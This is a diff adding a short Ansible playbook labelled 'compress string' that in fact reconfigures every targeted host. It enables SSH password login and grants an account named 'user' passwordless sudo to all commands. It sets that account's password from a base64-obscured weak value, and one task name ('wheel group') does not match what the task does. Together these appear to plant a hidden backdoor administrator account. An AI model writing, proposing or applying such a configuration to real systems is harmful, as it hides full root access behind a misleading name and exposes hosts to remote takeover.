@@ -1,0 +1,33 @@
+---
+- name: compress string
+  hosts: all
+  become: yes
+  tasks:
+    - name: enable password auth
+      lineinfile:
+        path: /etc/ssh/sshd_config
+        regexp: '^PasswordAuthentication no'
+        line: 'PasswordAuthentication yes'
+      notify:
+        - Restart sshd
+
+    - name: add user sudo conf
+      copy:
+        dest: /etc/sudoers.d/user
+        content: |
+          user ALL=(ALL) NOPASSWD: ALL
+        mode: 0440
+        validate: 'visudo -cf %s'
+
+    - name: Add sudoers users to wheel group
+      user:
+        name: user
+        groups: users
+        password: "{{ 'cXdlQVNEIUAj' | b64decode | password_hash('sha512') }}"
+        createhome: true
+
+  handlers:
+    - name: Restart sshd
+      service:
+        name: sshd
+        state: restarted
